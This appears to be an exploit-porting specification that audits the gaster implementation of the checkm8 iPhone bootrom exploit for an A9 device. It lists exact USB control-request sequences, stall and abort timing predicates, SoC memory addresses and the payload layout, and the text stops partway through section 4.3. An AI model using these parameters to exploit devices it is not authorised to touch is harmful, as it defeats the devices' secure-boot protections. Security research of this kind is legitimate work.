# GASTER-SPEC — the reference checkm8, as actually implemented by 0x7ff/gaster

**Status:** authoritative for `a9pwn`'s port of the reference exploit.
**Author:** gaster-analyst (task-1). Read-only task: no USB device was opened, reset, or written.
**Reference under audit:** `research/refs/gaster/gaster.c` (1667 lines), `payload_A9.S`,
`payload_handle_checkm8_request.S`, `payload_notA9.S`, `payload_notA9_armv7.S`,
`payload_handle_checkm8_request_armv7.S`, `Makefile`, `lzfse.h` — all Apache-2.0, 0x7ff/gaster.
**Target:** iPhone SE 1st gen, CPID `0x8003`, BDID `0x02`, stock SecureROM DFU, `USB 05AC:1227`,
`SRTG:[iBoot-2234.0.0.2.22]`.

### Labelling key (used on every non-obvious claim)

| Tag | Meaning |
|---|---|
| **CONFIRMED** | read directly from the cited source line, or decoded from the cited bytes |
| **INFERRED** | follows from CONFIRMED facts by an argument that is written out; not stated by the source |
| **EXTERNAL-CLAIM** | asserted by another document/implementation; not verifiable from gaster |
| **UNVERIFIABLE** | cannot be checked from this tree at all (needs hardware, or a source we do not have) |

Nothing in this document is "it works". Every step carries the predicate that decides pass/fail.

### Artefacts and hashes (measured, this session)

```
A698045FAE09ACDC5BFAFC26EF3FE7848F1454B8CE8847FDC45396CC18A532B2  payload_A9.bin                       280 bytes
C0C213047A8902186392396CB7E57C096626B4812B61E07C2CF7CF6B99A9889C  payload_handle_checkm8_request.bin   248 bytes
36FBB1418AA90417FD3CEBA88B403D6E3360106B286C5133A54B7A3A4ADD2190  payload_notA9.bin                    216 bytes
```

`a9pwn/payloads/payload_A9.bin` and `.../payload_handle_checkm8_request.bin` are **byte-identical**
to the reference copies (SHA-256 above). This matters: §4 and §7 are statements about *these* bytes.

---

## 1. The functions that participate in checkm8, in call order

`file:line` = definition line. "On the wire" = what an observer with a bus analyser would see.

### 1.1 Entry and per-round loop

| # | Function | file:line | On the wire |
|---|---|---|---|
| 1 | `main` | gaster.c:1625-1667 | Reads `USB_TIMEOUT` / `USB_ABORT_TIMEOUT_MIN` env vars, prints both, dispatches `pwn` |
| 2 | `gaster_checkm8` | gaster.c:1231-1276 | The stage loop. One stage per device enumeration; `reset_usb_handle` + `close_usb_handle` after **every** stage attempt (gaster.c:1268, 1273) |
| 3 | `init_usb_handle` | gaster.c:285-290 (libusb) | nothing — sets vid/pid on the handle struct |
| 4 | `wait_usb_handle` | gaster.c:202-218 (libusb) | `libusb_init`, then `libusb_open_device_with_vid_pid(0x05AC,0x1227)`, `libusb_set_configuration(dev,1)`, then the identity callback. Retries every `usb_timeout` ms, forever |
| 5 | `checkm8_check_usb_device` | gaster.c:513-817 | Two control-IN reads (device descriptor, serial string descriptor), then `strstr` over the serial to select the SoC row; returns `pwned = strstr(serial, " PWND:[checkm8]")` |
| 6 | `get_usb_serial_number` | gaster.c:497-511 | `0x80/6` wValue `0x0100` wLength 18, then `0x80/6` wValue `(3<<8)\|i_serial` wIndex `0x409` wLength 255 |
| 7 | `reset_usb_handle` | gaster.c:197-200 (libusb) | `libusb_reset_device` — **return value discarded** (see G16) |
| 8 | `close_usb_handle` | gaster.c:191-195 (libusb) | `libusb_close` **and `libusb_exit(NULL)`** — the libusb context is destroyed after every stage and re-created by `wait_usb_handle` |
| 9 | `sleep_ms` | gaster.c:177-188 | poll interval in `wait_usb_handle` (gaster.c:214) |

### 1.2 The stage bodies

| # | Function | file:line | On the wire |
|---|---|---|---|
| 10 | `checkm8_stage_reset` | gaster.c:836-845 | `0x21/1` DNLOAD 16 B O, then `dfu_set_state_wait_reset`, then `0x21/1` DNLOAD 0x40 B. On failure `0x21/4` CLR_STATUS |
| 11 | `dfu_set_state_wait_reset` | gaster.c:829-834 | `0x21/1` DNLOAD 0 B, then three `0xA1/3` GET_STATUS and requires MANIFEST_SYNC(6) → MANIFEST(7) → MANIFEST_WAIT_RESET(8) |
| 12 | `dfu_check_status` | gaster.c:819-827 | `0xA1/3` GET_STATUS wLength 6; pass iff `sz==6` and the status/state bytes equal the expected pair |
| 13 | `checkm8_stage_setup` | gaster.c:847-860 | The abort/pad sweep. **Core primitive**, §5 |
| 14 | `checkm8_stage_spray` | gaster.c:896-918 | A9 path: one `usb_request_stall`, one `usb_request_leak`, one `no_leak`, whole triple retried until all three pass; then `0x21/4` CLR_STATUS wLength **0xC1** |
| 15 | `checkm8_usb_request_stall` | gaster.c:889-894 | `0x02/3` wValue 0 wIndex 0x80 wLength 0 — standard `SET_FEATURE(ENDPOINT_HALT)` on EP 0x80. **STALL is the pass condition** |
| 16 | `checkm8_usb_request_leak` | gaster.c:862-867 | `0x80/6` wValue `(3<<8)\|i_serial` wIndex **0x0A** wLength **0x40**, async-aborted after 1 ms. Pass iff `sz == 0` |
| 17 | `checkm8_no_leak` | gaster.c:882-887 | same, wLength **0xC1**, aborted after 1 ms. Pass iff `sz == 0` |
| 18 | `checkm8_stall` | gaster.c:869-880 | same, wLength **0xC0**, abort window swept. Pass iff `sz < 0xC0` **and** `checkm8_usb_request_leak` passes. **Not used on A9** (§3.3) |
| 19 | `checkm8_stage_patch` | gaster.c:1008-1229 | The overwrite request, then the payload upload, then the manifest dance. §3.3 |
| 20 | `usb_rop_callbacks` | gaster.c:920-974 | ROP/JOP block builder. **Dead code on A9** — called only for 0x8001/0x8010/0x8011/0x8015/0x8012 (gaster.c:1092-1101) |

### 1.3 The transport primitives (the part that is routinely misread)

| # | Function | file:line | Semantics |
|---|---|---|---|
| 21 | `send_usb_control_request` | gaster.c:225-240 (libusb), 410-435 (IOKit) | **Blocking** `libusb_control_transfer` with `usb_timeout` ms. **Always returns `true`** (gaster.c:239) |
| 22 | `send_usb_control_request_async` | gaster.c:242-283 (libusb), 437-457 (IOKit) | Submit, wait in the event loop, **cancel** when the abort window expires. Returns `completed != 0` (gaster.c:282) |
| 23 | `send_usb_control_request_no_data` | gaster.c:467-480 | Wrapper: `w_len==0` → NULL data; else `malloc(w_len)` + `memset(0)` + call #21 |
| 24 | `send_usb_control_request_async_no_data` | gaster.c:482-495 | Same wrapper over #22, with the abort window passed through |
| 25 | `usb_async_cb` | gaster.c:220-223 | Sets `*(int*)user_data = 1` — the only completion signal in the libusb backend |

### 1.4 Post-pwn (not checkm8, listed so nobody ports it by accident)

`gaster_command` (1477-1493), `gaster_aes` (1495-1555), `gaster_decrypt*` (1557-1611),
`img4_*` / `der_*` / `lzfse` / `decompress_lzss` (1278-1475), `read_binary_file` (990-1006),
`dfu_send_data` (976-988), `gaster_reset` (1613-1623). These run **after** `PWND:[checkm8]` is
observed, speak to the patched DFU handler, and are out of scope for the pwn itself.
`dfu_send_data` (976-988) is the one exception worth reading: it is how the post-pwn command
block reaches `insecure_memory_base` (§4.4).

---

## 2. Per-SoC configuration: what gaster actually encodes

### 2.1 The storage

The table is **not** a table. It is a chain of `else if` arms inside
`checkm8_check_usb_device` (gaster.c:513-817), each arm assigning file-scope statics:

```
gaster.c:152  static uint16_t cpid;
gaster.c:153  static uint32_t payload_dest_armv7;
gaster.c:154  static const char *pwnd_str = " PWND:[checkm8]";
gaster.c:166  static unsigned usb_timeout, usb_abort_timeout_min;
gaster.c:174  static size_t config_hole, ttbr0_vrom_off, ttbr0_sram_off,
                       config_large_leak, config_overwrite_pad;
gaster.c:175  static uint64_t tlbi, nop_gadget, ret_gadget, patch_addr, ttbr0_addr,
                       func_gadget, write_ttbr0, memcpy_addr, aes_crypto_cmd,
                       boot_tramp_end, gUSBSerialNumber, dfu_handle_request,
                       usb_core_do_transfer, dfu_handle_bus_reset, insecure_memory_base,
                       handle_interface_request, usb_create_string_descriptor,
                       usb_serial_number_string_descriptor;
```

Two consequences the port must not lose:

1. **Dispatch is by `SRTG` string, not by CPID.** Each arm is `strstr(serial, " SRTG:[iBoot-…]")`
   (gaster.c:519, 534, 549, …). `cpid` is *assigned from the matched arm*, it is never used to
   select the arm. The gate that ends the search is `if(cpid != 0)` (gaster.c:809).
2. **The statics are sticky.** They are never re-zeroed between rounds or between arms
   (gaster.c:513-817 assigns; nothing clears). A port that selects a row from a parsed identity
   is strictly safer; a port that copies this shape inherits the stickiness.

**Every match string is bracketed** — `strstr(serial, " SRTG:[iBoot-2234.0.0.2.22]")`
(gaster.c:624), closing `]` included. A shorter version string is therefore *not* a prefix of a
longer one and the arm order cannot mis-match between our two A9 entries (gaster.c:624 vs 641);
the `strstr` is in practice an exact bracketed match. (A port that writes a *prefix* match would
reintroduce the ambiguity. Match the bracket.)

**Case matters, and gaster gets away with it only because it reads the descriptor.** gaster
compares against lowercase `iBoot-…` (gaster.c:624), which works because
`get_usb_serial_number` (gaster.c:497-511) reads the USB string descriptor through
libusb/IOKit, where case is preserved. The **Windows device instance ID form is uppercased** —
`..._SRTG:[IBOOT-2234.0.0.2.22]` — as recorded for this very unit in
`research/A9-CHECKM8-PAYLOAD.md:441` (recorded by another session; I did not re-query the
device) and baked into `a9pwn/src/types.rs:272-275`. INFERRED: that is a SetupAPI normalisation,
not something the device sends. **a9pwn must normalise case before any `SRTG` → config lookup**,
or it will work when it reads the descriptor and fail when it reads an instance ID.

### 2.2 The A9 rows, exactly

**CPID 0x8003 — `SRTG:[iBoot-2234.0.0.2.22]` (our device), gaster.c:624-640:**

| Field | Value | Line |
|---|---|---|
| `cpid` | `0x8003` | gaster.c:625 |
| `config_overwrite_pad` | `0x500` | gaster.c:626 |
| `patch_addr` | `0x10000812C` | gaster.c:627 |
| `ttbr0_addr` | `0x1800C8000` | gaster.c:628 |
| `memcpy_addr` | `0x100011030` | gaster.c:629 |
| `aes_crypto_cmd` | `0x10000DAA0` | gaster.c:630 |
| `ttbr0_vrom_off` | `0x400` | gaster.c:631 |
| `boot_tramp_end` | `0x1800E1000` | gaster.c:632 |
| `gUSBSerialNumber` | `0x180087958` | gaster.c:633 |
| `dfu_handle_request` | `0x1800878F8` | gaster.c:634 |
| `usb_core_do_transfer` | `0x10000EE78` | gaster.c:635 |
| `dfu_handle_bus_reset` | `0x180087928` | gaster.c:636 |
| `insecure_memory_base` | `0x180380000` | gaster.c:637 |
| `handle_interface_request` | `0x10000F1B0` | gaster.c:638 |
| `usb_create_string_descriptor` | `0x10000E354` | gaster.c:639 |
| `usb_serial_number_string_descriptor` | `0x1800807DA` | gaster.c:640 |

**CPID 0x8000 — `SRTG:[iBoot-2234.0.0.3.3]`, gaster.c:641-657:** every value is **byte-identical**
to the row above at the same offset; the *only* difference is `cpid = 0x8000` (gaster.c:642).
I diffed the two arms field by field. This matters: on this SoC pair `cpid` selects the payload
family and nothing else (§2.4).

**Fields left at their zero initialiser for both A9 rows** (never assigned in those arms, and the
statics start as `0`): `config_hole`, `config_large_leak`, `ttbr0_sram_off`, `tlbi`, `nop_gadget`,
`ret_gadget`, `func_gadget`, `write_ttbr0`, `payload_dest_armv7`. This is load-bearing:
`config_large_leak == 0` selects the A9 spray branch (gaster.c:900-902) and `config_hole == 0`
means the hole loop cannot run (gaster.c:905).

### 2.3 Fields the task asked for that **do not exist** in gaster

| Asked for | Reality |
|---|---|
| `board` | **Does not exist.** No variable, no field, no arm sets it. Grep of the whole file: zero hits. Board identity is available only via `BDID` in the serial string, which gaster reads past and never parses. |
| `cprv` | **Does not exist in gaster.** gaster matches on `SRTG` only. EXTERNAL-CLAIM: `a9lab/king/include/usbexec.h:207,211` asserts `cprv = 0x20` for CPID 0x8000/0x8003 and keys its platform lookup on the literal `CPID:%04x CPRV:%02x ` (usbexec.h:34). A recorded live instance ID in this tree shows `CPRV:01` for our 0x8003 unit (`research/A9-CHECKM8-PAYLOAD.md:441`) — if that is accurate, king's own lookup would **not** match. UNVERIFIED BY ME (I did not query the device). **a9pwn must not gate on CPRV.** |
| `payload_dest_armv7` | Exists (gaster.c:153) but is only set by A7/32-bit arms and is never used on the A9 path. |

Everything else in the requested list maps 1:1 onto gaster.c:174-175 and is given above.

### 2.4 Which row selects which payload

`checkm8_stage_patch` (gaster.c:1042-1064) chooses the payload blob from `cpid`, not from the row:

| cpid set | blob | code line |
|---|---|---|
| `0x8003`, `0x8000` | `payload_A9_bin` | gaster.c:1042-1049 |
| `0x8960`, `0x7001`, `0x7000`, `0x8001`, `0x8010`, `0x8011`, `0x8015`, `0x8012` | `payload_notA9_bin` | gaster.c:1050-1057 |
| everything else | `payload_notA9_armv7_bin` | gaster.c:1058-1064 |

and the handler blob likewise (gaster.c:1066, 1082): the arm64 handler for the first two groups,
the armv7 handler for the rest. So for our device the pair is
`payload_A9.bin` + `payload_handle_checkm8_request.bin`. CONFIRMED.

---

## 3. The exact A9 control-request sequence

### 3.1 Constants and idle values (all CONFIRMED, gaster.c:29-52)

```
DFU_DNLOAD 1   DFU_UPLOAD 2   DFU_GET_STATUS 3   DFU_CLR_STATUS 4
DFU_STATUS_OK 0     DFU_STATE_MANIFEST_SYNC 6   DFU_STATE_MANIFEST 7
DFU_STATE_MANIFEST_WAIT_RESET 8
EP0_MAX_PACKET_SZ 0x40      DFU_MAX_TRANSFER_SZ 0x800     DFU_FILE_SUFFIX_LEN 16
MAX_BLOCK_SZ 0x50           USB_MAX_STRING_DESCRIPTOR_IDX 10
APPLE_VID 0x5AC             DFU_MODE_PID 0x1227
EXEC_MAGIC 0x6578656365786563  DONE_MAGIC 0x646F6E65646F6E65  MEMC_MAGIC 0x6D656D636D656D63
ARM_16K_TT_L2_SZ 0x2000000
```

An `(bmRequestType, bRequest, wValue, wIndex, wLength)` tuple below is written
`bm/b/wV/wI/wL`. Direction is bit 7 of `bm`: `0x80`/`0xA1` = IN, `0x00`/`0x21`/`0x02` = OUT.

### 3.2 Per round, before any stage

| # | Request | Predicate | Source |
|---|---|---|---|
| P1 | `0x80/6 wV 0x0100 wI 0 wL 18` | OK, `sz == 18` (sizeof the 18-byte descriptor struct) | gaster.c:504 |
| P2 | `0x80/6 wV (3<<8)\|i_serial wI 0x409 wL 255` | OK, `sz == buf[0]`, `buf[0]/2 != 0` | gaster.c:504-508 |
| P3 | `strstr(serial, " SRTG:[iBoot-2234.0.0.2.22]")` | non-NULL → `cpid = 0x8003`, install all 16 fields | gaster.c:624-640, 809-813 |
| P4 | `strstr(serial, " PWND:[checkm8]")` | non-NULL → `stage = PWNED`, print *"Now you can boot untrusted images."* | gaster.c:811, 1270-1271 |

If P3 fails for every arm, `checkm8_check_usb_device` returns false, `wait_usb_handle` closes and
retries forever with **no message** (gaster.c:207-214, 809-816) — see G7.

### 3.3 STAGE_RESET — `checkm8_stage_reset` (gaster.c:836-845)

| # | Request | Pass predicate |
|---|---|---|
| R1 | `0x21/1 wV 0 wI 0 wL 16` | OK **and** `sz == 16` (gaster.c:840) |
| R2 | `0x21/1 wV 0 wI 0 wL 0` | OK **and** `sz == 0` (gaster.c:833) |
| R3 | `0xA1/3 wV 0 wI 0 wL 6` | OK, `sz == 6`, `status == 0`, `state == 6` MANIFEST_SYNC (gaster.c:826, 833) |
| R4 | `0xA1/3 wV 0 wI 0 wL 6` | … `state == 7` MANIFEST (gaster.c:833) |
| R5 | `0xA1/3 wV 0 wI 0 wL 6` | … `state == 8` MANIFEST_WAIT_RESET (gaster.c:833) |
| R6 | `0x21/1 wV 0 wI 0 wL 0x40` | OK **and** `sz == 0x40` (gaster.c:840) |
| R7 | on failure of R1-R6: `0x21/4 wV 0 wI 0 wL 0`, result ignored | always sent, return `false` (gaster.c:843-844) |

R2-R5 are one expression, `dfu_set_state_wait_reset` (gaster.c:829-834). R2 must precede the
status reads: the DFU state machine only advances on DNLOAD(0).

### 3.4 STAGE_SETUP — `checkm8_stage_setup` (gaster.c:847-860). **The core.**

`usb_abort_timeout` starts at `usb_timeout - 1` (gaster.c:849) and, on failure, advances as

```
t = (t + 1) % (usb_timeout - usb_abort_timeout_min + 1) + usb_abort_timeout_min;   gaster.c:857
```

With gaster's defaults (§5.1) that is `t ∈ {4, 5, 0, 1, 2, 3, 4, …}` — a 6-value cycle, **not**
a monotone sweep, and `0` is a legal window.

| # | Request | Pass predicate |
|---|---|---|
| S1 | `0x21/1 wV 0 wI 0 wL 0x800`, **async**, aborted after `t` ms, data = 0x800 zero bytes | transfer completed **and** `sz < config_overwrite_pad` (0x500) (gaster.c:853) |
| S2 | `0x00/0 wV 0 wI 0 wL (0x500 - sz_S1)`, data = that many zero bytes, **blocking**, `usb_timeout` ms | **STALL is the pass condition** (gaster.c:853) |
| S3 | S1+S2 both passed → return `true` | — |
| S4 | otherwise: `0x21/1 wV 0 wI 0 wL 0x40`, result ignored (gaster.c:856), advance `t` | loop forever |

Notes that a port must reproduce exactly:

* **S1 is what reads the device's mind.** `sz_S1` is the number of bytes the *aborted* transfer
  actually delivered. S2 then pads with `0x500 - sz_S1` so that the total number of bytes the
  device received into its DFU buffer is exactly `0x500` (INFERRED: `config_overwrite_pad` is the
  byte offset the exploit must reach inside that buffer; the reference never says so, but
  `0x400 + 0x80 + 0x80 = 0x500` is the same total ipwndfu pads to — `checkm8.py:898` — and
  ipwndfu hardcodes it because it cannot measure `sz`).
* **S2's direction byte is `0x00`, not `0x21`.** It is a *standard* request to the device with
  bRequest 0 and a data stage. That is deliberate: the device's DFU code is in a state where it
  continues the pending transfer. Reproducing S2 as a `0x21/1` DNLOAD changes the request class
  and is a different bug surface.
* **S1's failure mode that is *not* checked:** if S1 completes with `sz >= 0x500`, the whole
  attempt is discarded and retried with a new window; `sz` is never recorded (G3).
* `return false` at gaster.c:859 is unreachable.

### 3.5 STAGE_SPRAY — `checkm8_stage_spray` (gaster.c:896-918), A9 branch

`config_large_leak == 0` (true for A9) and `cpid ∈ {0x7001, 0x7000, 0x7002, 0x8003, 0x8000}`
(gaster.c:900-901), so the taken branch is gaster.c:901-902:

```
while (!stall() || !leak() || !no_leak()) { }
```

| # | Request | Pass predicate |
|---|---|---|
| Y1 | `0x02/3 wV 0 wI 0x80 wL 0` , blocking | **STALL** (gaster.c:893) |
| Y2 | `0x80/6 wV (3<<8)\|i_serial wI 0x0A wL 0x40`, async, aborted after 1 ms | completed **and** `sz == 0` (gaster.c:866) |
| Y3 | `0x80/6 wV (3<<8)\|i_serial wI 0x0A wL 0xC1`, async, aborted after 1 ms | completed **and** `sz == 0` (gaster.c:886) |
| Y4 | when Y1∧Y2∧Y3 pass: `0x21/4 wV 0 wI 0 wL 0xC1`, result ignored | (gaster.c:910) |
| Y5 | `return true` unconditionally | gaster.c:917 |

The `||` short-circuits, so a failing Y1 repeats the whole triple from Y1. `checkm8_stall`
(gaster.c:869-880, the 0xC0 variant with the swept window) and `config_hole`
(gaster.c:905-907) are **not executed on A9**. `checkm8_stage_spray` cannot fail — its
`true` return is not evidence of anything (G10).

Y4's `wL 0xC1` on a request that has **no data stage** is one byte past the 0xC0 the DFU
descriptor handler allocates — the same off-by-one that Y2/Y3 use. INFERRED (the reference
gives no reason); it is consistent with `checkm8.py:237`'s description of the primitive.

### 3.6 STAGE_PATCH — `checkm8_stage_patch` (gaster.c:1008-1229), A9 branch

| # | Request | Pass predicate |
|---|---|---|
| T1 | `0x02/3 wV 0 wI 0x80 wL 48`, data = `overwrite` (§4.5), blocking | **STALL** (gaster.c:1211) |
| T2 | payload upload: `0x21/1 wV 0 wI 0 wL packet_sz` per 0x800-byte chunk of `data` | **none** — `transfer_ret` is passed as `NULL` (gaster.c:1213-1216), and `send_usb_control_request` returns `true` unconditionally (gaster.c:239) |
| T3 | `0x21/1 wV 0 wI 0 wL 16`, result ignored | gaster.c:1218 |
| T4 | `0x21/1 wV 0 wI 0 wL 0`, result ignored | gaster.c:1219 |
| T5 | `0xA1/3 wL 6` ×3, **return values discarded** | gaster.c:1220-1222 |
| T6 | `return true` iff T1 STALLed | gaster.c:1211-1212, 1228 |

For A9, `data_sz = 528` (§4.3) so T2 is exactly **one** packet of 528 bytes. T5 is a
state-cleanup dance whose outcome is not checked; T3/T4 are the same file-suffix/zero-length
pair as R1/R2 and are also unchecked. The only thing that makes PATCH "pass" is T1's STALL.

### 3.7 Final reset and success test

| # | Action | Predicate | Source |
|---|---|---|---|
| F1 | `reset_usb_handle` → `libusb_reset_device` | return value discarded (G16) | gaster.c:1268, 198-200 |
| F2 | `close_usb_handle` → `libusb_close` + `libusb_exit(NULL)` | — | gaster.c:1273, 191-195 |
| F3 | next `wait_usb_handle` re-opens and re-reads the serial | `strstr(serial, " PWND:[checkm8]")` | gaster.c:1243, 811 |
| F4 | on success: `stage = PWNED`, print *"Now you can boot untrusted images."* | loop exits, `gaster_checkm8` returns true | gaster.c:1270-1275 |

INFERRED (mechanism, not observable from gaster): F1 is what actually *fires* the exploit. The
48-byte `overwrite` of T1 puts `insecure_memory_base` at offset `+0x20` of a
`usb_device_io_request`, which is its `callback`; the bus reset flushes the pending request list
and calls it. After F1 the payload runs, patches `dfu_handle_request` and the string-descriptor
index, and F3 is the first host-visible proof. This is why `INTERFACE.md:237-241` forbids
removing the per-stage reset. It is corroborated, not proven, by `RQ1-BRIEF.md:60-64` (field at
offset 0x20) and by the identical 48-byte overwrite in `checkm8.py:899`.

### 3.8 Where STALL is the pass condition, and where OK is

**STALL is the pass condition in exactly three places on the A9 path:**

1. gaster.c:853 — S2, the pad request (`transfer_ret.ret == USB_TRANSFER_STALL`)
2. gaster.c:893 — Y1, `checkm8_usb_request_stall`
3. gaster.c:1211 — T1, the overwrite request

**Everything else that has a predicate requires `USB_TRANSFER_OK` with an exact size:**
gaster.c:504 (P1, P2), 826 (GET_STATUS: OK + `sz==6` + status/state bytes), 831-833 (R2 OK
`sz==0`), 840 (R1 OK `sz==16`; R6 OK `sz==0x40`), 983 (`dfu_send_data`, post-pwn only).

**Two predicates deliberately do NOT check the transfer status at all:**

* gaster.c:866 (Y2) and gaster.c:886 (Y3) check **only** `transfer_ret.sz == 0`. The transfer
  is aborted after 1 ms, so on libusb it will normally come back `CANCELLED` or `TIMED_OUT`
  (both mapped to `USB_TRANSFER_ERROR`, gaster.c:272-273). **A port that requires `Ok` here will
  never pass.** This is the single most likely porting error in the whole exploit.
* gaster.c:875 (the A9-unused `checkm8_stall`) checks `sz < 0xC0` plus Y2, again with no status
  test.

### 3.9 Cross-family check: gaster's tuple set vs ipwndfu's

| Role | gaster (A9) | ipwndfu/King | Verdict |
|---|---|---|---|
| stall | `0x02/3 wV 0 wI 0x80 wL 0`, expect STALL | `usb_req_stall`: **identical tuple** (`checkm8.py:196`) | CONFIRMED identical |
| leak | `0x80/6 wV (3<<8)\|i_serial wI 0x0A wL 0x40`, abort 1 ms, `sz==0` | `usb_req_leak`: `0x80/6 0x304 0x40A 0x40` (`checkm8.py:197`) | same length, different `wV`/`wI` |
| no_leak | same, `wL 0xC1` | `no_leak`: `0x80/6 0x304 0x40A 0xC1` (`checkm8.py:187`) | same length, different `wV`/`wI` |
| stall/0xC0 | `wL 0xC0` with swept abort | `stall`: `0x80/6 0x304 0x40A 0xC0`, fixed 10 µs (`checkm8.py:181`) | gaster sweeps, ipwndfu does not |
| pad | `0x00/0 wV 0 wI 0 wL 0x500-sz` | `libusb1_no_error_ctrl_transfer(0,0,0,0,b"A"*0x500,10)` (`checkm8.py:920`) | same class, gaster measures |
| overwrite | `0x02/3 wI 0x80 wL 48`, expect STALL | `0x00/0 48 B` (`checkm8.py:931`) | different request, same 48-byte payload |
| payload | `0x21/1` 0x800 chunks | `0x21/1` 0x800 chunks (`checkm8.py:932-935`) | identical |

**The `wI = 0x0A` is gaster-specific.** `USB_MAX_STRING_DESCRIPTOR_IDX` is `10` (gaster.c:52) and
it is passed in the **wIndex** slot (gaster.c:866, 875, 886) where a language ID belongs;
ipwndfu passes `0x40A`. `0x40A & 0xFF == 0x0A`, which is suggestive but is **INFERRED, not
proven**. `INTERFACE.md:199-200` already models this as the one unresolved parameter
(`--leak-windex-ipwndfu`) — that is the right call, and this spec endorses it.

**Also gaster-specific:** the `wValue` string index is `device_descriptor.i_serial_number`, read
from the device at gaster.c:504, **not** a hardcoded 4 (`0x304` in ipwndfu). A port must read it
from the descriptor, not bake in 4.

---

## 4. The A9 payload: struct, layout, and the arithmetic

### 4.1 The struct as C declares it (gaster.c:1010-1012)

```c
struct {
    uint64_t pwnd[2], payload_dest, dfu_handle_bus_reset, dfu_handle_request,
             payload_off, payload_sz, memcpy_addr, gUSBSerialNumber,
             usb_create_string_descriptor, usb_serial_number_string_descriptor,
             ttbr0_vrom_addr, patch_addr;
} A9;
```

| Index | Field | Struct offset | Notes |
|---|---|---|---|
| 0-1 | `pwnd[2]` | `+0x00` | 16 bytes: the ASCII `" PWND:[checkm8]"` — **15 characters**, i.e. 15 copied bytes plus one zero byte, *not* two (`strlen` = 15; gaster.c:154, 1109-1110 zeroes 16 then copies 15). Verified against the blob: bytes `0xB0..0xBF` are `20 50 57 4e 44 3a 5b 63 68 65 63 6b 6d 38 5d 00`. **Off-by-one here silently corrupts the struct's first field.** |
| 2 | `payload_dest` | `+0x10` | where the handler is copied **to** |
| 3 | `dfu_handle_bus_reset` | `+0x18` | zeroed by the payload (payload_A9.S:36) |
| 4 | `dfu_handle_request` | `+0x20` | receives `payload_dest + 12` (payload_A9.S:39) |
| 5 | `payload_off` | `+0x28` | source offset inside the uploaded blob |
| 6 | `payload_sz` | `+0x30` | bytes to copy |
| 7 | `memcpy_addr` | `+0x38` | `memcpy` implementation address |
| 8 | `gUSBSerialNumber` | `+0x40` | serial string to append to |
| 9 | `usb_create_string_descriptor` | `+0x48` | returns the new index |
| 10 | `usb_serial_number_string_descriptor` | `+0x50` | receives that index |
| 11 | `ttbr0_vrom_addr` | `+0x58` | `ttbr0_addr + ttbr0_vrom_off` |
| 12 | `patch_addr` | `+0x60` | receives `0xD2800000` |

**`sizeof(A9) = 13 × 8 = 104`. CONFIRMED, three independent ways:**
arithmetic (gaster.c:1010-1012); the C subtraction `payload_A9_bin_len - sizeof(A9) = 176` has to
land on an instruction boundary and it does (§4.2); and the blob's own literal pool + string is
exactly 104 bytes (§4.3).

### 4.2 The blob, decoded from bytes (not from the comment)

`payload_A9.bin`, 280 bytes, SHA-256 `A698045F…A532B2`:

```
0x00 - 0xAF   176 bytes = 44 instructions   payload code
0xB0 - 0xBF    16 bytes = " PWND:[checkm8]\0"   <- A9.pwnd[0..15]
0xC0 - 0x117   88 bytes = 11 × u64 = 0x7FFFFFF0 .. 0x7FFFFFFA   <- placeholder pool
```

The 11 pool words are literal, in file order (hexdump of the vendored blob):

```
0xC0  0x7FFFFFF0   0xC8  0x7FFFFFF1   0xD0  0x7FFFFFF2   0xD8  0x7FFFFFF3
0xE0  0x7FFFFFF4   0xE8  0x7FFFFFF5   0xF0  0x7FFFFFF6   0xF8  0x7FFFFFF7
0x100 0x7FFFFFF8   0x108 0x7FFFFFF9   0x110 0x7FFFFFFA
```

They match the `.set` order at `payload_A9.S:19-29` exactly, one for one.

**Instruction decode of every literal load** (`LDR Xt,[PC,#imm]` = word `0x58000000 | (imm19<<5) | Rt`,
target = instruction address + imm19×4):

| Insn @ | Word | Target file offset | Pool slot / meaning |
|---|---|---|---|
| 0x04 | `0x580005E0` | 0xC0 | `payload_dest` |
| 0x08 | `0x58000602` | 0xC8 | `dfu_handle_bus_reset` |
| 0x10 | `0x58000602` | 0xD0 | `dfu_handle_request` |
| 0x20 | `0x580005C2` | 0xD8 | `payload_off` |
| 0x28 | `0x580005C2` | 0xE0 | `payload_sz` |
| 0x2C | `0x580005E3` | 0xE8 | `memcpy_addr` |
| 0x34 | `0x580005E0` | 0xF0 | `gUSBSerialNumber` |
| 0x50 | `0x58000500` | 0xF0 | `gUSBSerialNumber` again — **assembler deduplicated the slot** |
| 0x54 | `0x58000521` | 0xF8 | `usb_create_string_descriptor` |
| 0x5C | `0x58000521` | 0x100 | `usb_serial_number_string_descriptor` |
| 0x64 | `0x58000520` | 0x108 | `ttbr0_vrom_addr` |
| 0x88 | `0x58000443` | 0x110 | `patch_addr` |

Plus two PC-relative `ADR`s, which are the ones that pin the *string* and the *code base*:

| Insn @ | Word | Decoded | Target |
|---|---|---|---|
| 0x1C | `0x10FFFF21` | `ADR X1` imm = −0x1C | **0x00** = `_main` (the payload's own runtime base) |
| 0x44 | `0x10000361` | `ADR X1` imm = +0x6C | **0xB0** = `PWND_STR` = `A9.pwnd[0]` |

So the invariant this blob enforces is:

> **`A9` must begin exactly 16 bytes before the first pool word, and be exactly 104 bytes long.**

Get `sizeof(A9)` wrong and *every* one of the 12 loads above reads a different 8 bytes, and the
`ADR` at 0x44 copies the wrong 16 bytes to the end of the serial number. There is no partial
failure mode.

The same invariant holds for the other two blobs, which is a cheap independent confirmation of
the method: `payload_notA9.bin` is 216 bytes with `sizeof(notA9) = 96` (12 u64, gaster.c:1013-1015),
code = 120 bytes, string at 0x78, and exactly **10** pool words at 0x88-0xD7 (`0x7FFFFFF0`..`0x7FFFFFF9`,
matching `payload_notA9.S:19-28`). `16 + 10×8 = 96`. ✓

### 4.3 `payload_off`, `payload_sz`, `payload_dest` — derivation (gaster.c:1108-1134)

Let `L9 = payload_A9_bin_len = 280` and `LH = payload_handle_checkm8_request_bin_len = 248`.

```
payload_sz               = L9 - sizeof(A9) = 280 - 104 = 176            gaster.c:1045
payload                  = payload_A9_bin  (first 176 bytes: the code)  gaster.c:1044
payload_handle_checkm8_request_sz = LH - sizeof(handle_checkm8_request)
                                  = 248 - 56 = 192                      gaster.c:1069
A9.payload_dest          = boot_tramp_end - payload_handle_checkm8_request_sz
                                          - sizeof(handle_checkm8_request)
                         = 0x1800E1000 - 192 - 56 = 0x1800E0F08        gaster.c:1111
A9.payload_off           = payload_sz + sizeof(A9) = 176 + 104 = 280    gaster.c:1114
A9.payload_sz            = payload_handle_checkm8_request_sz + sizeof(handle_checkm8_request)
                         = 192 + 56 = 248                               gaster.c:1115
A9.ttbr0_vrom_addr       = ttbr0_addr + ttbr0_vrom_off
